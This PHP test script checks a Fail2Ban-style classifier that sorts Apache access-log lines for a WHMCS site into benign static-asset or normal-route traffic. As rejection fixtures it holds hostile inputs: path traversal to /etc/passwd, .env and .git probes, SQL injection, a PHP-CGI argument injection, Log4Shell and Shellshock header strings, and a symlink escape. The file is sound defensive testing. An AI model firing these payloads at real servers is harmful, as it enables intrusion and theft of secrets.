<?php
namespace AMS\Fail2Ban;
if(PHP_SAPI!=='cli')exit(1);
class Database {public static array $cfg=['schema_version'=>'36'];public static function getConfig($k,$d=''){return self::$cfg[$k]??$d;}}
require dirname(__DIR__).'/lib/Router.php';date_default_timezone_set('America/Sao_Paulo');
$n=0;$now=time();$ip='198.51.100.77';$source='/var/log/apache2/access_whmcs.log';$exists=fn($s,$p)=>$s===$source&&in_array($p,['/assets/css/site.css','/templates/lagom2/assets/js/vendor.js'],true);
function loCheck($v,$m){global $n;if(!$v)throw new \RuntimeException($m);$n++;}
function loEvent($target='/assets/css/site.css',$status=200,$verb='GET',$age=1,$peer=null,$tail='"-" "Mozilla/5.0"') {global $now,$ip;$peer=$peer??$ip;$t=$now-$age;$line=$peer.' - - ['.date('d/M/Y:H:i:s O',$t).'] "'.$verb.' '.$target.' HTTP/1.1" '.$status.' 12 '.$tail;return ['id'=>hash('sha256',$line),'ip'=>$peer,'time'=>$t,'line'=>$line,'pattern'=>BehaviorStore::pattern($line)];}
$run=fn($es,$s=null,$peer=null)=>LocalObservation::reason($es,$s??$source,$peer??$ip,null,$now,$exists);
foreach(['GET','HEAD'] as $verb)foreach([200,304] as $status)foreach(['/assets/css/site.css','/assets/css/site.css?v=1.2-abc','/templates/lagom2/assets/js/vendor.js?ver=abc123'] as $target)loCheck($run([loEvent($target,$status,$verb)])==='static','Static positive');
foreach(['GET','HEAD'] as $verb)foreach(['/','/clientarea.php','/index.php','/license.php'] as $target)loCheck($run([loEvent($target,200,$verb)])==='normal','Normal positive');
foreach([201,206,301,302,303,307,308,400,403,404,410,421,500,503] as $status)loCheck($run([loEvent(status:$status)])===null,'Other status');
foreach(['POST','PUT','PATCH','DELETE','OPTIONS','TRACE'] as $verb)loCheck($run([loEvent(verb:$verb)])===null,'Other verb');
foreach(['/.env','/.git/config','/wp-config.php','/assets/css/missing.css','/templates/../../etc/passwd','/assets/.private.css','/assets//css/site.css','/assets/css/../site.css','/assets/css/site.css/','/assets/css/site.css.php','/uploads/site.css','/%61ssets/css/site.css','/assets/css/site.css?x=1','/assets/css/site.css?v=1&ver=2','/assets/css/site.css?v=%31','/assets/css/site.css?v=','/assets/css/site.css?version='.str_repeat('a',65),'/index.php?rp=/login','/?x=1','/?x=UNION+SELECT+1--','/?-d+allow_url_include=1+-d+auto_prepend_file=php://input','/assets/css/site.css?x=../../etc/passwd','/assets/css/site.css?v=1%0a','/assets/css/site.css?V=1','http://example.org/assets/css/site.css'] as $target)loCheck($run([loEvent($target)])===null,'Unsafe/unknown target '.$target);
foreach(['"-" "${jndi:ldap://evil/a}"','"-" "() { :; }; bash"','"-" "UNION SELECT 1--"','"https://e.invalid/%24%7bjndi%3Aldap" "Mozilla"','"-" "curl http://evil"','"-" "<script>"','"-" "\\x00"'] as $tail)loCheck($run([loEvent(tail:$tail)])===null,'Header signal');
$e=loEvent();foreach(['id'=>'invalid','ip'=>'198.51.100.78','time'=>$e['time']-1,'truncated'=>true,'source_log'=>'/var/log/apache2/error.log','pattern'=>'wrong','line'=>$e['line']."\n"] as $k=>$v){$bad=$e;$bad[$k]=$v;loCheck($run([$bad])===null,'Corrupt event '.$k);}
loCheck($run([$e,$e])===null,'Duplicate ID');loCheck($run([$e,loEvent('/.env')])===null,'Mixed malicious');loCheck($run([$e,loEvent('/')])===null,'Mixed observation kind');
loCheck($run([loEvent(age:1801)])===null&&$run([loEvent(age:-1)])===null,'Date window');
loCheck($run([$e],'/var/log/apache2/error_whmcs.log')===null,'Error source');
$v6=loEvent(peer:'2001:db8::77');loCheck($run([$v6],peer:'2001:db8::77')==='static','IPv6 peer');
$row=['id'=>hash('sha256','row'),'ip'=>$ip,'source_log'=>$source,'pattern'=>$e['pattern'],'revision'=>2,'analyzed_revision'=>1,'processing_state'=>'pending','attempts'=>0,'events'=>1,'samples'=>json_encode([$e])];
loCheck(LocalObservation::incoming(null,[$e],$source,$now,$exists)==='static','New row');
loCheck(LocalObservation::incoming($row,[$e],$source,$now,$exists)==='static','Complete pending history');
foreach(['processing_state'=>'review','attempts'=>1,'events'=>2,'samples'=>'invalid','decision_state'=>'rejected','blocked_confirmed_at'=>'2026-10-01','source_log'=>'/var/log/apache2/access.log'] as $k=>$v){$r=$row;$r[$k]=$v;loCheck(LocalObservation::incoming($r,[$e],$source,$now,$exists)===null,'Unresolved history '.$k);}
$r=$row;$r['samples']=json_encode([loEvent('/assets/css/site.css?x=bad')]);loCheck(LocalObservation::incoming($r,[$e],$source,$now,$exists)===null,'Mixed prior history');
$r=$row;$r['events']=100;$r['analyzed_revision']=2;$r['processing_state']='observed_static';loCheck(LocalObservation::incoming($r,[$e],$source,$now,$exists)==='static','Already locally observed bounded history');
Database::$cfg['ai_non_offensive_paths']="/phpinfo\n/phpinfo.php\n/info.php\n/configuration.php\n/config.php.bak\n/web/database/list\n/xmlrpc/2/common\n/druid/index.html\n/actuator/health\n/php-myadmin\n/myadmin";
foreach(explode("\n",Database::$cfg['ai_non_offensive_paths']) as $target)loCheck($run([loEvent($target)])===null,'Normal catalog concealed probe '.$target);
unset(Database::$cfg['ai_non_offensive_paths']);
foreach(['/','/tmp/','/assets','/templates/../','/assets/%2e/','/assets/secret.php/','/assets//'] as $bad){try{LocalObservation::prefixes($bad);loCheck(false,'Unsafe prefix accepted');}catch(\InvalidArgumentException $ex){loCheck(true,'Prefix refused');}}
loCheck(LocalObservation::prefixes("/assets/\n/assets/\n/templates/lagom2/")===['/assets/','/templates/lagom2/'],'Prefix canonicalization');
loCheck(LocalObservation::reason([$e],$source,$ip,null,$now,fn()=>false)===null,'Missing/outside asset');
Database::$cfg['ai_local_static_prefixes']='/templates/';loCheck($run([$e])===null,'Prefix selection ignored');unset(Database::$cfg['ai_local_static_prefixes']);
foreach(['ai_local_observation_enabled','ai_local_static_enabled'] as $key){Database::$cfg[$key]='0';loCheck($run([$e])===null,'Toggle '.$key);unset(Database::$cfg[$key]);}
Database::$cfg['ai_local_normal_routes_enabled']='0';loCheck($run([loEvent('/')])===null,'Normal toggle');unset(Database::$cfg['ai_local_normal_routes_enabled']);
$temporary=sys_get_temp_dir().'/amsfb-local-'.bin2hex(random_bytes(8));mkdir($temporary,0700);mkdir($temporary.'/assets',0700);
try {file_put_contents($temporary.'/assets/site.css','body{}');symlink('/etc/passwd',$temporary.'/assets/outside.css');
    loCheck(LocalObservation::assetWithin($temporary,'/assets/site.css'),'Existing local asset');
    foreach(['/assets/outside.css','/assets/missing.css','/assets/','/assets/../site.css','/assets/%2e%2e/site.css'] as $p)loCheck(!LocalObservation::assetWithin($temporary,$p),'Filesystem escape/unknown '.$p);
}finally{unlink($temporary.'/assets/outside.css');unlink($temporary.'/assets/site.css');rmdir($temporary.'/assets');rmdir($temporary);}
Database::$cfg['schema_version']='35';loCheck($run([$e])===null,'Prior schema');
echo "PASS: {$n} conservative local observation checks; pure resolver, no SQL/provider/native\n";
